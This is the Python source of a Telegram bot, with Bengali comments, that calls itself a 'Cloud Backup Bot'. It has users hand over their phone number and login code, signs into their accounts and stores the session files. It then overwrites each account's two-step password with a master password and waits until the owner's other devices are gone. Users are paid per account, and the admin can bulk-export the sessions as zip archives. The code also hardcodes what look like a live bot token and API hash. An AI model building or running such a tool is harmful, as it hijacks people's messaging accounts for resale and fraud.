import os
import asyncio
import json
import shutil
import zipfile
import sys
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== CORE CONFIGURATION ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8288574083:AAFuTtmz2pqZavP7x8jlhnWJ0Gdad8r2olk"
ADMIN_ID = 8095751648

# 📢 এখানে আপনার চ্যানেলগুলোর আইডি বসাবেন (যেমন: -100XXXXXXXXXX)
MAIN_CHANNEL_ID = -1003904729385      # মেইন চ্যানেল (যেখানে জয়েন না করলে বট কাজ করবে না)
SESSION_LOG_CHANNEL_ID = -1004345512666 # নতুন ভেরিফাইড সেশন জমার চ্যানেল
WITHDRAW_LOG_CHANNEL_ID = -1004331985961 # উইথড্র রিকোয়েস্ট আসার চ্যানেল

# প্রজেক্টের লিংক (ইউজারকে জয়েন লিংকে দেখানোর জন্য)
MAIN_CHANNEL_LINK = "https://t.me/your_main_channel_username" 
# =================================================================

BASE_STORAGE_DIR = "user_backups"
TRASH_STORAGE_DIR = "trash_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

for folder in [BASE_STORAGE_DIR, TRASH_STORAGE_DIR]:
    if not os.path.exists(folder):
        try: os.makedirs(folder, exist_ok=True)
        except: pass

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15, "57": 0.24, "63": 0.10},
    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50, "57": 100, "63": 100},
    "country_delays": {"52": 600, "60": 600, "49": 600, "54": 600, "880": 600, "57": 600, "63": 30}
}

# ==================== DATABASE CONTROLLER ====================
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded: loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def is_number_already_verified(phone_number, country_code=None):
    db = load_db()
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    verified_list = db.get("verified_numbers", [])
    if clean in verified_list or phone_number in verified_list: return True
    if country_code:
        if os.path.exists(os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean}.session")): return True
    for code in load_settings()["country_prices"].keys():
        if os.path.exists(os.path.join(BASE_STORAGE_DIR, code, f"+{clean}.session")): return True
    return False

def add_to_verified_numbers(phone_number):
    db = load_db()
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    if "verified_numbers" not in db: db["verified_numbers"] = []
    if clean not in db["verified_numbers"]: db["verified_numbers"].append(clean)
    save_db(db)

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "pending_balance": 0.0, "verified_balance": 0.0}
        save_db(db)
    else:
        if "pending_balance" not in db[uid]: db[uid]["pending_balance"] = 0.0
        if "verified_balance" not in db[uid]: db[uid]["verified_balance"] = db[uid].get("balance", 0.0)
    return db[uid]

def add_user_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db: get_user_stats(user_id); db = load_db()
    db[uid]["unverified"] += 1
    db[uid]["pending_balance"] = round(db[uid]["pending_balance"] + amount, 2)
    save_db(db)

def convert_pending_to_verified(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["verified"] += 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        db[uid]["verified_balance"] = round(db[uid]["verified_balance"] + amount, 2)
        save_db(db)

def reject_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        save_db(db)

def clear_user_verified_balance_and_stats(user_id):
    """উইথড্র করার পর ইউজারের ভেরিফাইড ব্যালেন্স এবং ভেরিফাইড সংখ্যা ০ করার ২য় রিকোয়েস্টের ফিক্স"""
    db = load_db()
    uid = str(user_id)
    if uid in db:
        db[uid]["verified_balance"] = 0.0
        db[uid]["verified"] = 0  # উইথড্র করার পর প্রোফাইলে ভেরিফাইড একাউন্ট ডাটা ০ হয়ে যাবে
        if "balance" in db[uid]: db[uid]["balance"] = 0.0
        save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

def get_trash_file_count():
    if not os.path.exists(TRASH_STORAGE_DIR): return 0
    try: return len([f for f in os.listdir(TRASH_STORAGE_DIR) if f.endswith(".session")])
    except: return 0

# ==================== FLASK SERVER ====================
app = Flask("UptimeServer")
@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code in settings["country_prices"]:
        count = get_current_file_count(code)
        total_sessions += count
        cap = settings["country_capacity"].get(code, "No Limit")
        country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"
    trash_count = get_trash_file_count()
    html_template = f"""
    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><p>Trash (Exported) Files: <b>{trash_count} Pcs</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
    """
    return render_template_string(html_template)

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ==================== TELEGRAM BOT CORE ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
user_data = {}
admin_state = {}

bot_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()

def is_user_joined_main_channel(user_id):
    """৩য় ফিক্স: মেইন চ্যানেলে জয়েন আছে কিনা চেক করা"""
    if user_id == ADMIN_ID: return True
    try:
        member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return True # চ্যানেল আইডি ভুল থাকলে বা বট অ্যাড না থাকলে যেন আটকে না যায়

def check_force_join(message):
    """ইউজার চ্যানেলে জয়েন না থাকলে তাকে আটকে মেসেজ দেওয়া"""
    if not is_user_joined_main_channel(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=MAIN_CHANNEL_LINK))
        bot.send_message(
            message.chat.id, 
            "⚠️ **You must join our main channel to use this bot!**\n\nদয়া করে নিচের চ্যানেলে জয়েন করে আবার ট্রাই করুন। জয়েন না করলে বটের কোনো কমান্ড কাজ করবে না।", 
            reply_markup=markup
        )
        return False
    return True

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    settings = load_settings()
    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code): return code
    return None

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_force_join(message): return
    bot.send_message(message.chat.id, "👋 **Welcome to Cloud Backup Telegram Bot**\n\nTo start a secure backup of your Telegram Account, please send your phone number with your country code.\nExample: `+88017XXXXXXXX` or `+52XXXXXXXXXX`")

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    if user_id in user_data:
        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message):
    if not check_force_join(message): return
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, 999)
        delay = settings.get("country_delays", {}).get(code, 60)
        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|{delay}s\n\n"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['account'])
def cmd_account(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Total Verified Balance : {stats['verified_balance']:.2f} USDT\n"
        f"⏳ Total Pending Balance : {stats['pending_balance']:.2f} USDT\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Only Withdraw Your Verified Balance.*\n\n/withdraw"
    )
    bot.send_message(message.chat.id, response)

# ==================== WITHDRAWAL SYSTEM ====================
@bot.message_handler(commands=['withdraw'])
def cmd_withdraw(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    if stats['verified_balance'] <= 0.0:
        bot.send_message(message.chat.id, f"⚠️ **Minimum withdrawal condition is valid balance. Your balance is 0.00 USDT.**")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 Withdraw Card", callback_data="wtd_card"),
        types.InlineKeyboardButton("🪙 USDT (BEP-20)", callback_data="wtd_bep20")
    )
    bot.send_message(message.chat.id, "⚡ **Choose Your Withdrawal Method Below:**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("wtd_"))
def handle_withdraw_selection(call):
    user_id = call.from_user.id
    stats = get_user_stats(user_id)
    if stats['verified_balance'] <= 0.0:
        bot.answer_callback_query(call.id, "❌ You don't have enough balance!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    bot.delete_message(call.message.chat.id, call.message.message_id)
    if call.data == "wtd_card":
        bot.send_message(call.message.chat.id, "💳 **Send your card info:**")
        admin_state[user_id] = "wait_wtd_card"
    elif call.data == "wtd_bep20":
        bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
        admin_state[user_id] = "wait_wtd_bep20"

# ==================== EXPORTER LOGIC ====================
def export_logic(chat_id, country_code, amount):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.send_message(chat_id, f"❌ No sessions for `+{country_code}`")
        return
    all_files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
    all_files.sort(key=lambda x: os.path.getmtime(os.path.join(target_dir, x)), reverse=True)
    selected_files = all_files[:amount]
    if not selected_files:
        bot.send_message(chat_id, "❌ No files found.")
        return
    zip_filename = f"Export_{country_code}.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in selected_files:
                file_path = os.path.join(target_dir, file)
                zipf.write(file_path, arcname=file)
                jrnl = file + "-journal"
                jrnl_path = os.path.join(target_dir, jrnl)
                if os.path.exists(jrnl_path): zipf.write(jrnl_path, arcname=jrnl)
        with open(zip_filename, 'rb') as doc:
            bot.send_document(chat_id, doc, caption=f"📦 Exported {len(selected_files)} sessions for `+{country_code}`.")
        for file in selected_files:
            try: shutil.move(os.path.join(target_dir, file), os.path.join(TRASH_STORAGE_DIR, file))
            except: pass
            try: shutil.move(os.path.join(target_dir, file + "-journal"), os.path.join(TRASH_STORAGE_DIR, file + "-journal"))
            except: pass
        os.remove(zip_filename)
        bot.send_message(chat_id, "📥 **Files moved to Trash System successfully.** /panel থেকে ডেটা রিকভার বা পার্মানেন্টলি ক্লিয়ার করতে পারবেন।")
    except Exception as e: 
        bot.send_message(chat_id, f"❌ Export Error: {e}")

@bot.message_handler(commands=['export'])
def cmd_export_sessions(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ **Format:** `/export <country_code> <amount>`")
        return
    country_code = args[1].replace("+", "").strip()
    try: amount = int(args[2])
    except: return
    export_logic(message.chat.id, country_code, amount)

# ==================== MASTER ADMIN CONTROL PANEL ====================
@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country"))
    markup.add(types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"), types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
    
    trash_cnt = get_trash_file_count()
    # ১ নম্বর ফিক্স: Trash এর দুটি অপশন বাটন (লিস্ট দেখা এবং ডিলিট করা)
    markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
    markup.add(types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash"))
    
    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n📈 *Allowed Countries:*\n"
    for code in settings["country_prices"]:
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${settings['country_prices'][code]}** | Cap: **{settings['country_capacity'].get(code, 100)}**\n"
    panel_msg += f"\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored (As Bin Storage)."
    bot.send_message(message.chat.id, panel_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_set_country":
        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime`")
        admin_state[call.from_user.id] = "wait_country_all"
    
    elif call.data == "pnl_view_trash":
        # ১ নম্বর ফিক্সের ১ম পার্ট: ট্র্যাশে কি কি ফাইল এক্সপোর্ট করা আছে তার তালিকা বের করা
        if not os.path.exists(TRASH_STORAGE_DIR):
            bot.answer_callback_query(call.id, "Trash directory does not exist!", show_alert=True)
            return
        trash_files = [f for f in os.listdir(TRASH_STORAGE_DIR) if f.endswith(".session")]
        if not trash_files:
            bot.answer_callback_query(call.id, "🗑️ Trash Bin is totally empty!", show_alert=True)
            return
        list_msg = "🗑️ **Exposed/Exported Files List in Bin:**\n\n"
        for idx, f in enumerate(trash_files[:50], 1): # সর্বোচ্চ ৫০ টা ফাইল একসাথে দেখাবে
            list_msg += f"{idx}. `{f}`\n"
        if len(trash_files) > 50: list_msg += f"\nAnd {len(trash_files)-50} more files..."
        bot.send_message(call.message.chat.id, list_msg)
        bot.answer_callback_query(call.id)
        
    elif call.data == "pnl_clear_trash":
        # ১ নম্বর ফিক্সের ২য় পার্ট: পার্মানেন্টলি ট্র্যাশ ক্লিয়ার করা
        try:
            for file in os.listdir(TRASH_STORAGE_DIR):
                os.remove(os.path.join(TRASH_STORAGE_DIR, file))
            bot.answer_callback_query(call.id, "💥 All Trash Data Deleted Permanently!", show_alert=True)
        except Exception as e:
            bot.answer_callback_query(call.id, f"Error: {e}", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)
        
    elif call.data == "pnl_all_files":
        settings = load_settings()
        file_msg = "📂 *Live Country Session Files Count:*\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            file_msg += f"• 🌍 Country `+{code}` ➜ **{count} Pcs** Active\n"
            if count > 0:
                markup.add(types.InlineKeyboardButton(f"📥 Download from +{code} ({count} Pcs)", callback_data=f"pnl_askamt_{code}"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
    elif call.data.startswith("pnl_askamt_"):
        code = call.data.replace("pnl_askamt_", "")
        bot.send_message(call.message.chat.id, f"✏️ **Enter how many sessions you want to download for +{code}:**")
        admin_state[call.from_user.id] = f"wait_amt_{code}"
    elif call.data == "pnl_back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)

# ==================== TEXT MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id in admin_state:
        state = admin_state[user_id]
        
        if state == "wait_wtd_card":
            stats = get_user_stats(user_id)
            current_bal = stats['verified_balance']
            if current_bal <= 0.0:
                bot.reply_to(message, "❌ **Withdraw failed! Your verified balance is 0.00.**")
                del admin_state[user_id]
                return
            clear_user_verified_balance_and_stats(user_id) # ২য় ফিক্স অনুযায়ী একাউন্ট রিসেট
            del admin_state[user_id]
            bot.reply_to(message, f"✅ **Your Card withdrawal request for {current_bal} USDT has been submitted!**")
            
            # 💵 ২য় ফিক্স: এডমিন বটে না পাঠিয়ে নির্ধারিত উইথড্র চ্যানেলে পাঠানো হচ্ছে
            try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n💳 Info: {text}")
            except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! Card Withdraw Log: User `{user_id}` | Amt: {current_bal} | Info: {text}")
            return
            
        elif state == "wait_wtd_bep20":
            if len(text) != 42 or not text.startswith("0x"):
                bot.reply_to(message, "❌ **Invalid BEP-20 Address!** Must be 42 chars long and start with **0x**.")
                del admin_state[user_id]
                return
            stats = get_user_stats(user_id)
            current_bal = stats['verified_balance']
            if current_bal <= 0.0:
                bot.reply_to(message, "❌ **Withdraw failed! Your verified balance is 0.00.**")
                del admin_state[user_id]
                return
            clear_user_verified_balance_and_stats(user_id) # ২য় ফিক্স অনুযায়ী একাউন্ট রিসেট
            del admin_state[user_id]
            bot.reply_to(message, f"✅ **Your USDT (BEP-20) withdrawal request for {current_bal} USDT has been submitted!**")
            
            # 🪙 ২য় ফিক্স: এডমিন বটে না পাঠিয়ে নির্ধারিত উইথড্র চ্যানেলে পাঠানো হচ্ছে
            try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n🪙 Addr: `{text}`")
            except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! BEP20 Withdraw Log: User `{user_id}` | Amt: {current_bal} | Addr: {text}")
            return

        if user_id == ADMIN_ID:
            settings = load_settings()
            if state.startswith("wait_amt_"):
                code = state.replace("wait_amt_", "")
                del admin_state[user_id]
                try:
                    amount = int(text)
                    count = get_current_file_count(code)
                    if amount <= 0 or amount > count:
                        bot.reply_to(message, f"❌ **Invalid amount!** You only have {count} files available.")
                        return
                    bot.reply_to(message, f"⏳ Packing {amount} sessions for `+{code}`...")
                    export_logic(message.chat.id, code, amount)
                except:
                    bot.reply_to(message, "❌ **Please send a valid number!**")
                return

            del admin_state[user_id]
            try:
                if state == "wait_pass":
                    settings["security_password"] = text
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Updated: `{text}`")
                elif state == "wait_country_all":
                    parts = text.split("=")
                    code = parts[0].strip().replace("+", "")
                    settings["country_prices"][code] = float(parts[1].strip())
                    settings["country_capacity"][code] = int(parts[2].strip())
                    if "country_delays" not in settings: settings["country_delays"] = {}
                    settings["country_delays"][code] = int(parts[3].strip())
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Country `+{code}` updated.")
            except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
            return

    # সাধারণ ইউজার মেসেজ পাঠানোর সময়ও ফোর্স জয়েন চেক করা
    if not check_force_join(message): return

    if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
        return

    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        clean_phone = phone.replace("+", "").replace(" ", "").strip()
        if is_number_already_verified(clean_phone):
            bot.reply_to(message, "❌ This number already exists. Try another number.")
            return
        matched_code = check_valid_country_and_get_code(phone)
        if not matched_code:
            bot.reply_to(message, "❗you cannot at account from country.")
            return
        processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg), bot_loop)
    else:
        bot.reply_to(message, "❌ Invalid Format. Use /start to reset.")

# ==================== TELETHON ASYNC BACKEND ====================
async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
    settings = load_settings()
    if get_current_file_count(country_code) >= settings["country_capacity"].get(country_code, 9999):
        bot.edit_message_text(f"❌ Capacity Over!", message.chat.id, processing_msg.message_id)
        return
    clean_phone = phone_number.replace("+", "").replace(" ", "").strip()
    if is_number_already_verified(clean_phone, country_code):
        bot.edit_message_text("❌ This number already exists. Try another number.", message.chat.id, processing_msg.message_id)
        return
        
    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
    
    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, 
            "phone_code_hash": sent_code.phone_code_hash, "clean_phone": clean_phone, 
            "session_path": final_session_path, "country_code": country_code,
            "waiting_for_password": False
        }
        bot.edit_message_text(f"🔢 Enter the code sent to the number or send the message.\n\n🇨🇴 ( `{phone_number}` )\n\n🦤 /cancel", message.chat.id, processing_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", message.chat.id, processing_msg.message_id)
        try: await user_client.disconnect()
        except: pass

async def set_instant_master_2fa(client, master_password):
    try:
        await client.edit_2fa(new_password=master_password)
        return True
    except: return False

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    settings = load_settings()
    
    if data.get("waiting_for_password"):
        try:
            await data["client"].sign_in(password=text)
            await set_instant_master_2fa(data["client"], settings["security_password"])
            await process_backup(user_id, message, data)
            del user_data[user_id]
        except Exception as e: 
            bot.reply_to(message, f"❌ Password Error: {e}")
    else:
        try:
            await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await set_instant_master_2fa(data["client"], settings["security_password"])
            await process_backup(user_id, message, data)
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-step verification active. Enter Password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e: 
            bot.reply_to(message, f"❌ OTP Error: {e}")

async def process_backup(user_id, message, data):
    settings = load_settings()
    delay = settings.get("country_delays", {}).get(data['country_code'], 600)
    price = settings["country_prices"].get(data['country_code'], 0.24)
    
    add_to_verified_numbers(data["clean_phone"])
    add_user_pending_account(user_id, price) # ১ ঘণ্টা বা নির্ধারিত ডিলে পর্যন্ত এটি আনভেরিফাইড ও পেন্ডিং দেখাবে
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
    bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
    
    await asyncio.sleep(delay)
    max_wait_extended = 3600  
    interval = 60             
    elapsed = 0
    
    while elapsed <= max_wait_extended:
        try:
            if not data["client"].is_connected(): await data["client"].connect()
            if not await data["client"].is_user_authorized():
                reject_pending_account(user_id, price)
                db = load_db()
                if data["clean_phone"] in db.get("verified_numbers", []):
                    db["verified_numbers"].remove(data["clean_phone"])
                    save_db(db)
                return
                
            auths = await data["client"](functions.account.GetAuthorizationsRequest())
            other_devices = [a for a in auths.authorizations if not a.current]
            
            if len(other_devices) == 0:
                await data["client"].disconnect()
                convert_pending_to_verified(user_id, price) # সাকসেসফুল হলে আনভেরিফাইড কেটে ভেরিফাইটে যাবে
                bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
                
                # 🔔 ২য় ফিক্স: এডমিন আইডিতে না পাঠিয়ে সরাসরি "সেশন চ্যানেল"-এ অ্যালার্ট পাঠানো হচ্ছে
                try: bot.send_message(SESSION_LOG_CHANNEL_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
                except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! New Session: `{data['phone']}`")
                return
            else:
                if elapsed == 0:
                    bot.send_message(message.chat.id, f"⚠️ **Device Detected on `{data['phone']}`!**\n\nYour account has other active sessions. You have **1 hour** to clear all other devices from Telegram Settings and keep only this robot session, or it will be rejected.")
            await data["client"].disconnect()
        except: pass
        await asyncio.sleep(interval)
        elapsed += interval

    reject_pending_account(user_id, price)
    db = load_db()
    if data["clean_phone"] in db.get("verified_numbers", []):
        db["verified_numbers"].remove(data["clean_phone"])
        save_db(db)
    bot.send_message(message.chat.id, f"❌ **Verification Failed!** You did not clear other devices within 1 hour for `{data['phone']}`. Account rejected.")

# ==================== MAIN RUNNER ====================
if __name__ == "__main__":
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.infinity_polling(skip_pending=True)
